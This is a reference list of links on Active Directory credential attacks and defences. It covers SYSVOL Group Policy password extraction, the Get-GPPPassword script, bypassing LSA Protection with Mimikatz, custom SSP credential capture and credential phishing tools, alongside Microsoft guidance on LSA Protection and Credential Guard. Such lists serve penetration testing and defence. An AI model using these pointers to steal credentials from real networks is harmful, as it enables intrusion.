*   Finding Passwords in SYSVOL & Exploiting Group Policy Preferences - [https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288)
*   Get-GPPPassword - [https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
*   LSA Protection - [https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
*   LSA Protection Mimikatz bypass - [https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection)
*   Credential Guard - [https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)
*   Custom SSP live credential capturing - [https://book.hacktricks.xyz/windows/active-directory-methodology/custom-ssp](https://book.hacktricks.xyz/windows/active-directory-methodology/custom-ssp)
*   Credential phishing tools - [https://github.com/S3cur3Th1sSh1t/Pentest-Tools#post-exploitation—phish-credentials](https://github.com/S3cur3Th1sSh1t/Pentest-Tools#post-exploitation---phish-credentials)
*   AD-Attack-Defense - [https://github.com/infosecn1nja/AD-Attack-Defense](https://github.com/infosecn1nja/AD-Attack-Defense)
*   Methodology and Resources Active Directory Attack - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
*   AD-Security - [https://adsecurity.org/?page_id=4031](https://adsecurity.org/?page_id=4031)